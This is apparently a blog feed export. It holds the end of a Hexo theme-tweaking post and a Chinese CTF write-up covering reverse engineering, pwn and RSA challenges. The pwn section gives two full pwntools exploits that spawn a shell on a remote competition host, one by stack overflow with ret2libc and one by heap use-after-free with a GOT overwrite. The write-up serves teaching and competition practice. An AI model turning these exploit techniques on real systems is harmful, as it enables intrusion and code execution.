<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">busuanzi_count:</span><br><span class="line">  enable: true  #是否开启不蒜子统计功能</span><br><span class="line">  total_visitors: true #是否统计总访客数</span><br><span class="line">  total_visitors_icon: user #访客数图标为人像</span><br><span class="line">  total_views: true #是否同级总访问数</span><br><span class="line">  total_views_icon: eye #访问数图标为眼睛</span><br><span class="line">  post_views: true #是否统计文章访问数</span><br><span class="line">  post_views_icon: eye #访问数图标为眼睛</span><br></pre></td></tr></table></figure></li>
</ul>
<hr />
<ul>
<li>链接样式
修改文件 <code>themes\next\source\css\_common\components\post\post.styl</code>，在末尾添加如下css样式：
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.post-body p a&#123;</span><br><span class="line">  color: #0593d3;</span><br><span class="line">  border-bottom: none;</span><br><span class="line">  border-bottom: 1px solid #0593d3;</span><br><span class="line">  &amp;:hover &#123;</span><br><span class="line">    color: #6A5ACD;</span><br><span class="line">    border-bottom: none;</span><br><span class="line">    border-bottom: 1px solid #fc6423;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<hr />
<p>参考文章👇</p>
<p><a href="https://www.mickeymiao.top/posts/f9b8ceb/">hexo
NexT主题美化总结 | MickeyMiao</a></p>
<p>深度美化-放着吃灰</p>
<p><a
href="https://blog.csdn.net/maosidiaoxian/article/details/85220394">如何在Hexo中对文章md文件分类_貌似掉线的博客-CSDN博客</a>
<a href="https://zhuanlan.zhihu.com/p/64965187">使用 Hexo Hey
管理你的博客 - 知乎 (zhihu.com)</a></p>
]]></content>
      <categories>
        <category>CS Basics</category>
      </categories>
      <tags>
        <tag>Blog</tag>
      </tags>
  </entry>
  <entry>
    <title>comp - 2023HwsSDU专场CTF-wp</title>
    <url>/2023/11/19/comp%20-%202023HwsSDU%E4%B8%93%E5%9C%BACTF-wp/</url>
    <content><![CDATA[<blockquote class="blockquote-center">
HWS！PWN+RE+CRYPTO
</blockquote>
<span id="more"></span>
<h1 id="re">RE</h1>
<h2 id="re-1">Re</h2>
<blockquote>
<p>这个题本来打好逆向后的包准备写 wp
的，结果重新加载的时候给覆盖了...就不配图了，函数顺序按照反汇编从上到下来分析的。</p>
</blockquote>
<p>拿到这个题看到有反调试，没 patch ，直接静态分析了</p>
<h4 id="st-important-function">- 1st important function</h4>
<p>第一个重要函数里有一个 flag{} 的判断，还有一个对于'-'的判断，可以猜测
flag 的格式为 flag{uuid}</p>
<p>接下来的一个函数有花指令，把 E8 改成 90
以后重新反汇编，还是没有啥东西...为了不影响后面做题，还是回到一开始的地方把
jz 改成了 jnz
，然后动调发现这个带花的函数基本没啥用，好像就调用了个<code>__chkesp</code>函数，但我不太清楚这是干啥的，就直接忽略了</p>
<h4 id="nd-important-function">- 2nd important function</h4>
<p>第二个重要函数对我们输入的 flag
做了一些操作，把中间的'-'全部删掉，并做了一些移动的操作，大概就是
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa&#125;</span><br><span class="line">flag&#123;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&#125;</span><br></pre></td></tr></table></figure></p>
<h4 id="rd-important-function">- 3rd important function</h4>
<p>第三个函数将 uuid 的前 32
个字节作为参数，做了一些异或操作和比对操作，我们可以恢复一部分 flag
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">int</span> encdata1[<span class="number">13</span>];</span><br><span class="line"><span class="type">char</span> encdata2[<span class="number">16</span>];</span><br><span class="line"><span class="type">int</span> encdata3[<span class="number">22</span>];</span><br><span class="line"><span class="type">char</span> flag[<span class="number">42</span>]=<span class="string">&quot;flag&#123;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaxxxx&#125;&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">func1</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    encdata1[<span class="number">0</span>] = <span class="number">102</span>;</span><br><span class="line">    encdata1[<span class="number">1</span>] = <span class="number">52</span>;</span><br><span class="line">    encdata1[<span class="number">2</span>] = <span class="number">51</span>;</span><br><span class="line">    encdata1[<span class="number">3</span>] = <span class="number">49</span>;</span><br><span class="line">    encdata1[<span class="number">4</span>] = <span class="number">52</span>;</span><br><span class="line">    encdata1[<span class="number">5</span>] = <span class="number">57</span>;</span><br><span class="line">    encdata1[<span class="number">6</span>] = <span class="number">96</span>;</span><br><span class="line">    encdata1[<span class="number">7</span>] = <span class="number">60</span>;</span><br><span class="line">    encdata1[<span class="number">8</span>] = <span class="number">61</span>;</span><br><span class="line">    encdata1[<span class="number">9</span>] = <span class="number">34</span>;</span><br><span class="line">    encdata1[<span class="number">10</span>] = <span class="number">104</span>;</span><br><span class="line">    encdata1[<span class="number">11</span>] = <span class="number">33</span>;</span><br><span class="line">    encdata1[<span class="number">12</span>] = <span class="number">56</span>;</span><br><span class="line">    <span class="type">int</span> count = <span class="number">5</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">13</span>; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ( i % <span class="number">2</span> )</span><br><span class="line">        &#123;</span><br><span class="line">            flag[count] = encdata1[i] ^ (<span class="number">2</span>*i);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            flag[count] = encdata1[i] ^ i;</span><br><span class="line">        &#125;</span><br><span class="line">        count++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">func1</span>();</span><br><span class="line">    cout&lt;&lt;flag&lt;&lt;endl;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta"># flag&#123;f61703f2-50b7-4aaa-aaaa-aaaaaaaaaaaa&#125;</span></span><br></pre></td></tr></table></figure></p>
<p>可以看到，这个函数只对前13个字节做了操作，剩下的19个字节没用到</p>
<h4 id="th-important-function">- 4th important function</h4>
<p>第四个函数将 uuid
的中间18位放了进去，然后做了一大堆操作以后跟下面的东西做了比较</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">v5[<span class="number">0</span>] = <span class="number">63</span>;</span><br><span class="line">v5[<span class="number">1</span>] = <span class="number">-70</span>;</span><br><span class="line">v5[<span class="number">2</span>] = <span class="number">-60</span>;</span><br><span class="line">v5[<span class="number">3</span>] = <span class="number">-111</span>;</span><br><span class="line">v5[<span class="number">4</span>] = <span class="number">-60</span>;</span><br><span class="line">v5[<span class="number">5</span>] = <span class="number">116</span>;</span><br><span class="line">v5[<span class="number">6</span>] = <span class="number">2</span>;</span><br><span class="line">v5[<span class="number">7</span>] = <span class="number">38</span>;</span><br><span class="line">v5[<span class="number">8</span>] = <span class="number">-20</span>;</span><br><span class="line">v5[<span class="number">9</span>] = <span class="number">-110</span>;</span><br><span class="line">v5[<span class="number">10</span>] = <span class="number">56</span>;</span><br><span class="line">v5[<span class="number">11</span>] = <span class="number">-62</span>;</span><br><span class="line">v5[<span class="number">12</span>] = <span class="number">11</span>;</span><br><span class="line">v5[<span class="number">13</span>] = <span class="number">109</span>;</span><br><span class="line">v5[<span class="number">14</span>] = <span class="number">39</span>;</span><br><span class="line">v5[<span class="number">15</span>] = <span class="number">-45</span>;</span><br></pre></td></tr></table></figure>
<p>由于看到了这个函数里面有个子函数有超长的一串，虽然看不懂，但我怀疑这应该是某个加密算法的手搓版，于是就问
GPT 老师，它跟我说是MD5加密算法的一部分(后来用 findcrypt
插件也能看出来)。</p>
<p>而后面还有个函数是这18位中前14位的 base64_encode
，也就是说我们解码后只需要爆破后4位即可</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_md5</span>(<span class="params">text</span>):</span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(text.encode(<span class="string">&#x27;utf-8&#x27;</span>)).digest()</span><br><span class="line"></span><br><span class="line">target_hash = ([<span class="number">63</span>, -<span class="number">70</span>, -<span class="number">60</span>, -<span class="number">111</span>, -<span class="number">60</span>, <span class="number">116</span>, <span class="number">2</span>, <span class="number">38</span>, -<span class="number">20</span>, -<span class="number">110</span>, <span class="number">56</span>, -<span class="number">62</span>, <span class="number">11</span>, <span class="number">109</span>, <span class="number">39</span>, -<span class="number">45</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">            <span class="keyword">for</span> m <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">        <span class="comment"># 将i和j转换为两位16进制数</span></span><br><span class="line">                hex_i = <span class="built_in">format</span>(i, <span class="string">&#x27;01x&#x27;</span>)</span><br><span class="line">                hex_j = <span class="built_in">format</span>(j, <span class="string">&#x27;01x&#x27;</span>)</span><br><span class="line">                hex_k = <span class="built_in">format</span>(k, <span class="string">&#x27;01x&#x27;</span>)</span><br><span class="line">                hex_m = <span class="built_in">format</span>(m, <span class="string">&#x27;01x&#x27;</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 构建待加密的明文</span></span><br><span class="line">                plaintext = <span class="string">f&#x27;f47813c26594c0<span class="subst">&#123;hex_i&#125;</span><span class="subst">&#123;hex_j&#125;</span><span class="subst">&#123;hex_k&#125;</span><span class="subst">&#123;hex_m&#125;</span>&#x27;</span></span><br><span class="line">                <span class="comment"># print(plaintext)</span></span><br><span class="line">                </span><br><span class="line">                <span class="comment"># 计算MD5散列值</span></span><br><span class="line">                hashed_text = generate_md5(plaintext)</span><br><span class="line">                <span class="comment"># print(hashed_text.hex())</span></span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> hashed_text.<span class="built_in">hex</span>() == <span class="string">&#x27;3fbac491c4740226ec9238c20b6d27d3&#x27;</span>:</span><br><span class="line">                    <span class="built_in">print</span>(plaintext)</span><br><span class="line"></span><br><span class="line"><span class="comment"># flag&#123;f61703f2-50b7-4f47-813c-26594c0e581a&#125; // 这里的最后一位 a 不是真的 a ，是因为一开始我写的 flag 格式是a，这一位还是需要我们爆破的</span></span><br></pre></td></tr></table></figure>
<p>拿到平台上去爆破最后一位，没想到直接就是 0 ，一遍过~</p>
<blockquote>
<p>flag{f61703f2-50b7-4f47-813c-26594c0e5810}</p>
</blockquote>
<h1 id="pwn">PWN</h1>
<h2 id="inverse">inverse</h2>
<p>32位 + 整数溢出 + 简单栈溢出，思路真没啥好写的，直接上exp吧</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;i386&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">ip = <span class="string">&#x27;124.71.135.126:30011&#x27;</span>.split(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">file = <span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line"></span><br><span class="line">io = remote(ip[<span class="number">0</span>],<span class="built_in">int</span>(ip[<span class="number">1</span>]))</span><br><span class="line"><span class="comment"># io = process(file)</span></span><br><span class="line"><span class="comment"># gdb.attach(io, &#x27;breakpoint main&#x27;)</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.27.so&#x27;</span>)</span><br><span class="line"><span class="comment"># ---------------------------------------------------------------------</span></span><br><span class="line">io.send(<span class="string">&#x27;/bin/sh&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;-1&#x27;</span>)</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line"></span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">read_got = elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">work_addr = <span class="number">0x80493D5</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x40</span> + p32(puts_plt) + p32(work_addr) + p32(read_got)</span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&#x27; msg:&#x27;</span>)</span><br><span class="line">read_addr = u32(io.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;read_addr  ---&gt;  &#x27;</span>,<span class="built_in">hex</span>(read_addr))</span><br><span class="line"></span><br><span class="line">libc_base = read_addr - libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">sys_addr = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh  =  libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">bin_sh = <span class="number">0x0804C030</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;libc_base  ---&gt;  &#x27;</span>,<span class="built_in">hex</span>(libc_base))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;sys_addr  ---&gt;  &#x27;</span>,<span class="built_in">hex</span>(sys_addr))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;bin_sh  ---&gt;  &#x27;</span>,<span class="built_in">hex</span>(bin_sh))</span><br><span class="line"></span><br><span class="line">io.sendline(<span class="string">&#x27;-1&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x40</span> + p32(sys_addr) + p32(work_addr) + p32(bin_sh)</span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="controller">controller</h2>
<p>这题是 awdp/awd 的题吧，好多洞...但是为什么 patchelf
以后会给我报<code>libgcc_s.so.0</code>的错啊，我还从
lib64/lib/2.27libgcc库 中拷贝了对应文件，结果都不行...</p>
<p>灰盒的 heap 题太难打了...不过从22:00打到3:00出 flag
的一瞬间真的巨爽</p>
<p>这题逆向就挺费时间的，一堆没啥用的函数，就只有<code>choice == 1/2/3/6(堆题的uaf) || choice == 1/9(fmt + 栈)</code></p>
<p>...写 wp 的时候去看了一下 choice == 9，结果突然发现 strlen 用''
就可以随便绕...早知道不灰盒打堆了...</p>
<p>我的思路是 uaf + fastbin attack</p>
<ul>
<li>alloc 再 free 两个 chunk<br />
</li>
<li>由于 fastbin LIFO，利用 uaf 将 heap_list (堆指针表)的地址写入
chunk13 的 fd 和 bk</li>
<li>申请两个同样大小的 chunk ，我们就能用 chunk15 任意地址读写了</li>
<li>leak
<ul>
<li>首先把 malloc 的 got 写进 chunk15，然后 show，就可以leak libc
基址</li>
</ul></li>
<li>write
<ul>
<li>由于这个时候，heap_list 中还存有 malloc_got
，于是我们直接控制这个指针去写 malloc_got 指向的地址</li>
</ul></li>
<li>将 one_gadget 写入 malloc_got 指向的地址，当我们再去 malloc
的时候，就会调用 og 进而提权。</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">ip = <span class="string">&#x27;124.71.135.126:30070&#x27;</span>.split(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">file = <span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line"></span><br><span class="line">io = remote(ip[<span class="number">0</span>],<span class="built_in">int</span>(ip[<span class="number">1</span>]))</span><br><span class="line"><span class="comment"># io = process(file)</span></span><br><span class="line"><span class="comment"># gdb.attach(io, &#x27;breakpoint main&#x27;)</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.27.so&#x27;</span>)</span><br><span class="line"><span class="comment"># ---------------------------------------------------------------------</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">alloc</span>(<span class="params">size,content1,content2</span>):</span><br><span class="line">  io.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>, <span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">  io.sendlineafter(<span class="string">&#x27;length of the new pipe name? &#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">  io.sendlineafter(<span class="string">&#x27;name of the new pipe? &#x27;</span>, content1)</span><br><span class="line">  io.sendlineafter(<span class="string">&#x27;Please write a description: &#x27;</span>, content2)</span><br><span class="line">  io.sendlineafter(<span class="string">&#x27;(radius,speed,length): &#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index</span>):</span><br><span class="line">  io.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>, <span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">  io.sendlineafter(<span class="string">&#x27;Please choose pipe: &#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">  io.sendline()</span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,content</span>):</span><br><span class="line">  io.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>, <span class="built_in">str</span>(<span class="number">6</span>))</span><br><span class="line">  io.sendlineafter(<span class="string">&#x27;Choose &gt;&#x27;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">  io.sendlineafter(<span class="string">&#x27;Please choose pipe: &#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">  io.sendlineafter(<span class="string">&#x27;Plese input info &gt;&#x27;</span>,content)</span><br><span class="line">  io.sendline()</span><br><span class="line"></span><br><span class="line"><span class="comment"># def show(index):</span></span><br><span class="line"><span class="comment">#   io.sendlineafter(&#x27;&gt; &#x27;, str(1))</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ---------------------------------------------------------------------</span></span><br><span class="line">content1 = <span class="string">&#x27;a&#x27;</span>*<span class="number">8</span></span><br><span class="line">content2 = <span class="string">&#x27;b&#x27;</span>*<span class="number">80</span></span><br><span class="line"></span><br><span class="line">alloc(<span class="number">0x30</span>,content1,content2) <span class="comment"># 12</span></span><br><span class="line">alloc(<span class="number">0x30</span>,content1,content2) <span class="comment"># 13</span></span><br><span class="line">free(<span class="number">12</span>)</span><br><span class="line">free(<span class="number">13</span>)</span><br><span class="line">content = p64(<span class="number">0x60418f</span>)</span><br><span class="line">edit(<span class="number">13</span>,content)</span><br><span class="line">alloc(<span class="number">0x30</span>,content1,content1) <span class="comment"># 14</span></span><br><span class="line"></span><br><span class="line">malloc_got = elf.got[<span class="string">&#x27;malloc&#x27;</span>]</span><br><span class="line">content1 = <span class="string">b&#x27;\x00\x00\x00\x01\x00\x00\x02\x40\x00&#x27;</span> + p64(malloc_got) + p64(malloc_got)</span><br><span class="line">alloc(<span class="number">0x30</span>,content1,content1) <span class="comment"># 15</span></span><br><span class="line">io.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>, <span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># io.sendlineafter(&#x27;&gt; &#x27;, str(11))</span></span><br><span class="line"><span class="comment"># io.sendlineafter(&#x27;&gt; &#x27;, str(1))</span></span><br><span class="line">malloc_addr = u64(io.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;puts_addr   ---&gt;   &#x27;</span>,<span class="built_in">hex</span>(malloc_addr))</span><br><span class="line">libc_base = malloc_addr - libc.sym[<span class="string">&#x27;malloc&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;libc_base   ---&gt;   &#x27;</span>,<span class="built_in">hex</span>(libc_base))</span><br><span class="line">og = [<span class="number">0x4f2a5</span>,<span class="number">0x4f302</span>,<span class="number">0x10a2fc</span>]</span><br><span class="line">get_shell = libc_base + og[<span class="number">2</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;libc_base   ---&gt;   &#x27;</span>,<span class="built_in">hex</span>(get_shell))</span><br><span class="line">content = p64(get_shell)</span><br><span class="line">io.sendline()</span><br><span class="line">edit(<span class="number">2</span>,content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0x4f2a5 execve(&quot;/bin/sh&quot;, rsp+0x40, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  rsp &amp; 0xf == 0</span></span><br><span class="line"><span class="string">  rcx == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x4f302 execve(&quot;/bin/sh&quot;, rsp+0x40, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x40] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x10a2fc execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x70] == NULL</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>为了写这题我还特意写了个 exp_local.py 来测试本地高版本libc的堆..</p>
</blockquote>
<h1 id="crypto">Crypto</h1>
<blockquote>
<p>没想到 ak 的居然是密码，这俩都是板子题</p>
</blockquote>
<h2 id="ezrsa">ezRSA</h2>
<p>这题两个数的位置反了😭卡了好长时间来着，我说为什么 getPrime 生成的 p
怎么会不是素数</p>
<p>这题一眼求解二次剩余，公钥课上学过(没想到课堂上的东西能拿来打CTF)，从网上扒一个脚本直接解
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p=<span class="number">13107939563507459774616204141253747489232063336204173944123263284507604328885680072478669016969428366667381358004059204207134817952620014738665450753147857</span></span><br><span class="line">a=<span class="number">4124820799737107236308837008524397355107786950414769996181324333556950154206980059406402767327725312238673053581148641438494212320157665395208337575556385</span></span><br><span class="line"></span><br><span class="line">k=<span class="number">0</span></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> sympy</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line">P=(p-<span class="number">1</span>)</span><br><span class="line"><span class="keyword">if</span> p%<span class="number">4</span>==<span class="number">3</span>:</span><br><span class="line">    <span class="built_in">print</span>(gmpy2.powmod(a,<span class="built_in">int</span>((p+<span class="number">1</span>)//<span class="number">4</span>),p))</span><br><span class="line">    <span class="built_in">print</span>(-gmpy2.powmod(a,<span class="built_in">int</span>((p+<span class="number">1</span>)//<span class="number">4</span>),p))</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">while</span> P%<span class="number">2</span>==<span class="number">0</span>:</span><br><span class="line">        P=P//<span class="number">2</span></span><br><span class="line">        k=k+<span class="number">1</span></span><br><span class="line">    q=<span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span> q: </span><br><span class="line">        l=gmpy2.powmod(q,<span class="built_in">int</span>((p-<span class="number">1</span>)//<span class="number">2</span>),p)</span><br><span class="line">        <span class="keyword">if</span> l==p-<span class="number">1</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        q=sympy.nextprime(q)</span><br><span class="line">    b=gmpy2.powmod(q,P,p)</span><br><span class="line">    x=[<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(k)]</span><br><span class="line">    re_a=gmpy2.invert(a,p)</span><br><span class="line">    x[k-<span class="number">1</span>]=gmpy2.powmod(a,<span class="built_in">int</span>((P+<span class="number">1</span>)//<span class="number">2</span>),p)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,k):</span><br><span class="line">        m=re_a*<span class="built_in">pow</span>(x[k-i],<span class="number">2</span>)</span><br><span class="line">        n=<span class="built_in">pow</span>(<span class="number">2</span>,(k-i-<span class="number">1</span>))</span><br><span class="line">        <span class="keyword">if</span> gmpy2.powmod(m,n,p)==p-<span class="number">1</span>:</span><br><span class="line">            j0=<span class="number">1</span></span><br><span class="line">            x[k-i-<span class="number">1</span>]=x[k-i]*<span class="built_in">pow</span>(b,j0*(<span class="number">2</span>**(i-<span class="number">1</span>)))%p</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            j1=<span class="number">0</span></span><br><span class="line">            x[k-i-<span class="number">1</span>]=x[k-i]%p</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(p-x[<span class="number">0</span>]))</span><br></pre></td></tr></table></figure></p>
<p><img src="https://i.imgs.ovh/2023/11/19/H0sMV.png" /> ## hdRSA</p>
<p>3:00-5:00就在找这道题的关键词...</p>
<p>从 "rsa 特殊构造p" 到 "rsa D*V**2+1" 再到 "rsa
4p+1"，终于让我找到有用的东西了，从<a
href="https://lazzzaro.github.io/2020/05/06/crypto-RSA/index.html">Lazzzaro的这篇博客</a>里，找到了<a
href="https://github.com/crocs-muni/cm_factorization/tree/master">这个工具</a>,直接
tmux 四个窗口梭哈遍历 D！</p>
<p><img src="https://i.imgs.ovh/2023/11/19/H0KdW.png" /></p>
<p>分解出 pq 来以后就是常规 rsa 了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c = <span class="number">187275367513186345104534865239994699892170904489725413330767115192172530253625393062151741036312498277557971553595091826062438445856091864605758318579599363539202154625683947568962358702545878760994434813222953503460910447662183200334960821110618746899798165363389255347363192576250804362413854445821046755759458439443253294822553986237695607000569717855942461517564526611106601774100617668231506539201297550376834067118784548951699927659889815770492684106287801610261026674778509245649501695344652216367741171392139049785280654043804502329999760613658697298671602787929199239524617160567336634126185042907593427921016129734757065504417112269027028799047579450965076835882020261162192475637278445255805339324893626400179818784574957669576516363342104273184813708475202313539634027764340858242764934872804570810575764191987921655276520658100755510986290562980055133376750812535713567917823663134974180449002466833109112866681229626239871954125027501071383217816313440079294139254989413050731511516498127225020975071747314764552267845933494600295296885808466296844091612401062566502515356974852161817112538289440970059783116540091633055220150093646069438113246518726017868258339512247175386052684861670431148484455765445960495130308147156436998327553854387741014177421559585683382003377803158283603889312107837885491964835073892174406797445622388505256985237867456926792546588756970045576002345376035346727906264683596628903417932566383221754976804148878057310066885140776352202510584461556988179369177560403923399529842871087532495739921906849249072433614545319458973155343802539527630971239359995893495205324483418191744545506744253222956232506980824457995662900264427265978239540089825733734306363153471606200228841997928021468359645661221933848545854596097640552489404777927679709089475954033350287287833943519423030861868256961619722983499902810335</span></span><br><span class="line">n = <span class="number">33096175288799617332885493596511258888440358453102256111974374065036495822068464075458439385079681283300784394033678459971922442896911953328428642407754716510146046984798079937041965508206917903849763776133332707937459950657472389214381722675180680267601322518846740327465821156365587650099729691742190461412805684797779814685533693930646305944041615049326297326943100076228557922112634201762411823882923067995301189731472280199375045492462707426435369206000275852140154436138523135431398183605685558292967081125911301901297054082495113948914639318253241487821418208699929839737784553456855610093393448118070199739455826496959760666234289802691550674900249132625079210734817668179594279995452606850149910023259865865018456587324352517683345166425491765570317847294474465862853419534697702341855076162025452817851697206661893696022366036249393178638908539339295020704867579759381627143570013099522548331662583610480260816374537663388484058857535593674617306865531964557210014951552413188381377348691712215324849502237269091257254177594361462673394820625290047311824071283144407224377097941952921003488390311103844836693337484153112642144123202451448616874268629748106308916197705482562109976865909750993940531505632533612092949283847930960995869695789057029544449427781906344342797264345978489445078701515171567653738523776799040674254766432156368882928980932153475224426052931945431653258041618243874984992335406012522932804396135589408657623851913886829849924902377323777010305770791270972541703330906130888058398866646389282863329283996886695377698972231095420455078382570